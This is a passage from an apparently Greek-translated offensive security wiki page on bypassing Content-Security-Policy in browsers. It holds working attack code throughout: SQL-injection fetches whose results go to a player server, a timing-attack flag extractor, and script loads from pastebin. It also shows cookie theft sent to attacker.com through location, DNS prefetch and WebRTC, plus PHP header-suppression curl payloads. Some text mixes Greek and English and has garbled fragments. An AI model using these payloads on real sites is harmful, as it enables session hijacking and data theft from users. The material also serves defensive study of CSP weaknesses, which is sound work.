fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
Από: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Μπορείτε επίσης να εκμεταλλευτείτε αυτή τη διαμόρφωση για να **φορτώσετε javascript code που έχει εισαχθεί μέσα σε μια εικόνα**. Για παράδειγμα, αν η σελίδα επιτρέπει τη φόρτωση εικόνων από το Twitter. Μπορείτε να **δημιουργήσετε** μια **ειδική εικόνα**, να την **ανεβάσετε** στο Twitter και να εκμεταλλευτείτε το "**unsafe-inline**" για να **εκτελέσετε** έναν JS κώδικα (ως ένα κανονικό XSS) που θα **φορτώσει** την **εικόνα**, θα **εξαγάγει** τον **JS** από αυτή και θα **τον εκτελέσει**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Με Service Workers

Η συνάρτηση των Service workers **`importScripts`** δεν περιορίζεται από την CSP:


{{#ref}}
../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Policy Injection

**Έρευνα:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Αν μια **παράμετρος** που στέλνετε **επικολλάται μέσα** στη **δήλωση** της **policy**, τότε μπορείτε να **τροποποιήσετε** την **policy** με κάποιο τρόπο που θα την καθιστά **άχρηστη**. Μπορείτε να **επιτρέψετε script 'unsafe-inline'** με οποιοδήποτε από αυτά τα bypasses:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Επειδή αυτή η οδηγία θα **overwrite existing script-src directives**.\
You can find an example here: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Στον Edge είναι πολύ πιο απλό. Αν μπορείς να προσθέσεις στο CSP απλώς αυτό: **`;_`** ο **Edge** θα **drop** ολόκληρη την **policy**.\
Example: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; via XSS (iframe) - Time attack

Σημείωσε την έλλειψη της οδηγίας `'unsafe-inline'`\
Αυτή τη φορά μπορείς να κάνεις το θύμα να **load** μια σελίδα υπό **your control** μέσω **XSS** με ένα `<iframe`. Αυτή τη φορά θα κάνεις το θύμα να προσπελάσει τη σελίδα από όπου θέλεις να εξάγεις πληροφορίες (**CSRF**). Δεν μπορείς να έχεις πρόσβαση στο περιεχόμενο της σελίδας, αλλά αν κατά κάποιο τρόπο μπορείς να **control the time the page needs to load** μπορείς να εξάγεις τις πληροφορίες που χρειάζεσαι.

Αυτή τη φορά ένα **flag** θα εξαχθεί, κάθε φορά που ένας **char is correctly guessed** μέσω SQLi η **response** χρειάζεται **περισσότερο χρόνο** λόγω της sleep function. Έτσι, θα είσαι σε θέση να εξαγάγεις το flag:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### Μέσω Bookmarklets

Αυτή η επίθεση θα περιλάμβανε κάποιο social engineering όπου ο επιτιθέμενος **πείθει τον χρήστη να σύρει και να αποθέσει έναν σύνδεσμο πάνω στο bookmarklet του browser**. Αυτό το bookmarklet θα περιείχε **malicious javascript** κώδικα που όταν drag\&dropped ή κλικ θα εκτελούνταν στο περιβάλλον του τρέχοντος παραθύρου web, **παρακάμπτοντας το CSP και επιτρέποντας την κλοπή ευαίσθητων πληροφοριών** όπως cookies ή tokens.

For more information [**check the original report here**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP bypass by restricting CSP

In [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP is bypassed by injecting inside an allowed iframe a more restrictive CSP that disallowed to load a specific JS file that, then, via **prototype pollution** or **dom clobbering** allowed to **εκμεταλλευτεί ένα διαφορετικό script για να φορτώσει ένα αυθαίρετο script**.

You can **restrict a CSP of an Iframe** with the **`csp`** attribute:
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
Στο [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), ήταν δυνατό μέσω **HTML injection** να **περιοριστεί** πιο πολύ μια **CSP**, οπότε ένα script που εμπόδιζε το CSTI απενεργοποιήθηκε και ως αποτέλεσμα η **ευπάθεια έγινε εκμεταλλεύσιμη.**\
Η CSP μπορεί να γίνει πιο περιοριστική χρησιμοποιώντας **HTML meta tags** και τα inline scripts μπορούν να απενεργοποιηθούν **αφαιρώντας** την **entry** που επιτρέπει το **nonce** τους και **ενεργοποιώντας συγκεκριμένο inline script μέσω sha**:
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### JS exfiltration με Content-Security-Policy-Report-Only

Αν καταφέρεις να κάνεις τον server να απαντήσει με την κεφαλίδα **`Content-Security-Policy-Report-Only`** με μια **τιμή που ελέγχεται από εσένα** (ίσως εξαιτίας ενός CRLF), μπορείς να την κατευθύνεις προς τον server σου και αν **τυλίξεις** το **JS content** που θέλεις να exfiltrate με **`<script>`**, και επειδή είναι πολύ πιθανό το `unsafe-inline` να μην επιτρέπεται από την CSP, αυτό θα **προκαλέσει ένα CSP error** και μέρος του script (που περιέχει τις ευαίσθητες πληροφορίες) θα σταλεί στον server μέσω του `Content-Security-Policy-Report-Only`.

Για παράδειγμα [**δείτε αυτό το CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Leaking Πληροφορίες με CSP και Iframe

- Δημιουργείται ένα `iframe` που δείχνει σε ένα URL (ας το ονομάσουμε `https://example.redirect.com`) το οποίο επιτρέπεται από CSP.
- Αυτό το URL στη συνέχεια ανακατευθύνεται σε ένα μυστικό URL (π.χ. `https://usersecret.example2.com`) το οποίο **δεν επιτρέπεται** από το CSP.
- Ακούγοντας το `securitypolicyviolation` event, μπορεί κανείς να καταγράψει την ιδιότητα `blockedURI`. Αυτή η ιδιότητα αποκαλύπτει το domain της blocked URI, leaking το μυστικό domain στο οποίο ανακατευθύνθηκε το αρχικό URL.

Αξίζει να σημειωθεί ότι περιηγητές όπως Chrome και Firefox έχουν διαφορετική συμπεριφορά στην διαχείριση των iframes σε σχέση με το CSP, οδηγώντας σε πιθανή leakage ευαίσθητων πληροφοριών λόγω μη καθορισμένης συμπεριφοράς.

Μια άλλη τεχνική περιλαμβάνει την εκμετάλλευση του CSP για να συμπεράνετε τον μυστικό υποτομέα. Αυτή η μέθοδος βασίζεται σε αλγόριθμο δυαδικής αναζήτησης και στην προσαρμογή του CSP ώστε να συμπεριλαμβάνει συγκεκριμένα domains που σκόπιμα μπλοκάρονται. Για παράδειγμα, αν ο μυστικός υποτομέας αποτελείται από άγνωστους χαρακτήρες, μπορείτε επαναληπτικά να δοκιμάζετε διαφορετικούς υποτομείς τροποποιώντας την οδηγία CSP ώστε να τους μπλοκάρει ή να τους επιτρέπει. Ακολουθεί ένα snippet που δείχνει πώς μπορεί να ρυθμιστεί το CSP για να διευκολύνει αυτή τη μέθοδο:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Παρακολουθώντας ποιες αιτήσεις μπλοκάρονται ή επιτρέπονται από το CSP, μπορεί κανείς να περιορίσει τους πιθανούς χαρακτήρες στον μυστικό subdomain και τελικά να αποκαλύψει το πλήρες URL.

Και οι δύο μέθοδοι εκμεταλλεύονται τις ιδιαιτερότητες της υλοποίησης του CSP και τη συμπεριφορά των browsers, δείχνοντας πώς φαινομενικά ασφαλείς πολιτικές μπορούν ακούσια leak ευαίσθητες πληροφορίες.

Κόλπο από [**here**](https://ctftime.org/writeup/29310).

## Μη ασφαλείς τεχνολογίες για παράκαμψη του CSP

### PHP Errors when too many params

Σύμφωνα με το [**last technique commented in this video**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), η αποστολή υπερβολικών παραμέτρων (1001 GET parameters αν και το ίδιο μπορεί να γίνει και με POST params και περισσότερα από 20 αρχεία). Οποιοδήποτε ορισμένο **`header()`** στον PHP web κώδικα **δεν θα σταλεί** λόγω του σφάλματος που θα προκληθεί.

### PHP response buffer overload

Το PHP είναι γνωστό ότι **bufferίζει την απάντηση στα 4096** bytes από προεπιλογή. Επομένως, αν το PHP εμφανίζει μια warning, παρέχοντας **αρκετά δεδομένα μέσα στις warnings**, η **απάντηση** θα **σταλεί** **πριν** το **CSP header**, με αποτέλεσμα το header να αγνοηθεί.  
Η τεχνική λοιπόν βασικά συνίσταται στο **γέμισμα του response buffer με warnings**, ώστε το CSP header να μην σταλεί.

Idea from [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Kill CSP via max_input_vars (headers already sent)

Επειδή τα headers πρέπει να σταλούν πριν από οποιαδήποτε έξοδο, οι warnings που εκδίδει το PHP μπορούν να ακυρώσουν μετέπειτα κλήσεις `header()`. Αν τα δεδομένα χρήστη υπερβούν το `max_input_vars`, το PHP ρίχνει πρώτα μια startup warning· οποιοδήποτε μεταγενέστερο `header('Content-Security-Policy: ...')` θα αποτύχει με “headers already sent”, απενεργοποιώντας ουσιαστικά το CSP και επιτρέποντας reflective XSS που αλλιώς θα ήταν μπλοκαρισμένο.
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
Παράδειγμα:
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Επανεγγραφή σελίδας σφάλματος

Από [**this writeup**](https://blog.ssrf.kr/69) φαίνεται ότι ήταν δυνατό να bypass μια προστασία CSP φορτώνοντας μια σελίδα σφάλματος (πιθανώς χωρίς CSP) και επαναγράφοντας το περιεχόμενό της.
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME είναι μια τεχνική που εκμεταλλεύεται ένα XSS (ή ένα πολύ περιορισμένο XSS) **in an endpoint of a page** για να **abuse** **other endpoints of the same origin.** Αυτό γίνεται φορτώνοντας το vulnerable endpoint από μια attacker σελίδα και μετά ανανεώνοντας την attacker σελίδα προς το real endpoint στην ίδια origin που θέλετε να εκμεταλλευτείτε. Με αυτόν τον τρόπο το **vulnerable endpoint** μπορεί να χρησιμοποιήσει το αντικείμενο **`opener`** στο **payload** για να **access the DOM** του **real endpoint to abuse**. Για περισσότερες πληροφορίες δείτε:


{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

Επιπλέον, **wordpress** έχει ένα **JSONP** endpoint στο `/wp-json/wp/v2/users/1?_jsonp=data` που θα **reflect** τα **data** που στέλνονται στην έξοδο (με τον περιορισμό ότι μόνο γράμματα, αριθμοί και τελείες επιτρέπονται).

Ένας attacker μπορεί να εκμεταλλευτεί αυτό το endpoint για να δημιουργήσει ένα SOME attack κατά του WordPress και να το ενσωματώσει μέσα στο `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` — σημειώστε ότι αυτό το **script** θα **φορτωθεί** επειδή είναι **allowed by 'self'**. Επιπλέον, και επειδή το WordPress είναι εγκατεστημένο, ένας attacker μπορεί να εκμεταλλευτεί την **SOME attack** μέσω του **vulnerable** **callback** endpoint που **bypasses the CSP** για να δώσει περισσότερα privileges σε έναν χρήστη, να εγκαταστήσει ένα νέο plugin...\
Για περισσότερες πληροφορίες σχετικά με το πώς να πραγματοποιήσετε αυτή την επίθεση δείτε [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

Αν υπάρχει αυστηρή CSP που δεν σας επιτρέπει να **interact with external servers**, υπάρχουν κάποια πράγματα που πάντα μπορείτε να κάνετε για να exfiltrate την πληροφορία.

### Location

Μπορείτε απλά να ενημερώσετε το location για να στείλετε στον server του attacker τις μυστικές πληροφορίες:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### Meta tag

Μπορείτε να ανακατευθύνετε εισάγοντας ένα meta tag (αυτή είναι απλώς μια ανακατεύθυνση — αυτό δεν θα leak το περιεχόμενο)
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

Για να φορτώνουν οι σελίδες πιο γρήγορα, οι περιηγητές προεπιλύουν ονόματα κεντρικών υπολογιστών σε διευθύνσεις IP και τα αποθηκεύουν στην cache για μετέπειτα χρήση.\
Μπορείτε να υποδείξετε σε έναν περιηγητή να προεπιλύσει ένα όνομα κεντρικού υπολογιστή με: `<link rel="dns-prefetch" href="something.com">`

Μπορείτε να εκμεταλλευτείτε αυτή τη συμπεριφορά για να **exfiltrate sensitive information via DNS requests**:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
Ένας άλλος τρόπος:
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
Για να αποφευχθεί αυτό, ο server μπορεί να στείλει το HTTP header:
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> Φαίνεται πως αυτή η τεχνική δεν λειτουργεί σε headless browsers (bots)

### WebRTC

Σε αρκετές σελίδες θα διαβάσετε ότι **το WebRTC δεν ελέγχει την πολιτική `connect-src` του CSP**.

Στην πραγματικότητα μπορείτε να _leak_ πληροφορίες χρησιμοποιώντας ένα _DNS request_. Δείτε αυτόν τον κώδικα:
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
Μια άλλη επιλογή:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

Το παράθυρο διαπιστευτηρίων στέλνει ένα DNS αίτημα στο iconURL χωρίς να περιορίζεται από τη σελίδα. Λειτουργεί μόνο σε ασφαλές περιβάλλον (HTTPS) ή στο localhost.
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## Έλεγχος Πολιτικών CSP στο Διαδίκτυο

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Αυτόματη δημιουργία CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Αναφορές

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
